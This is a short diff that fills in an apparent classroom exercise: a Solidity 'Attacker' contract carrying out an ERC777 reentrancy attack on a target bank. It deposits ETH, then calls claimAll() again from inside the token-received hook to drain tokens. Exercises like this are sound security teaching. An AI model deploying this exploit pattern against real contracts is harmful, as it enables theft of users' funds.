@@ -35,9 +35,11 @@ contract Attacker is AccessControl, IERC777Recipient {
 	   amt is the amt of ETH the attacker will deposit initially to start the attack
 	*/
 	function attack(uint256 amt) payable public {
-      require( address(bank) != address(0), "Target bank not set" );
+		require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
-	}
+    bank.deposit{value: amt}();
+    bank.claimAll();
+} 
 
 	/*
 	   After the attack, this contract has a lot of (stolen) MCITR tokens
@@ -60,6 +62,15 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata operatorData
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
+   
+    if (depth < max_depth) {
+        depth++;
+        emit Recurse(depth);
+        bank.claimAll();
+    } else {
+        depth = 0;
+    }
+
 	}
 
 }
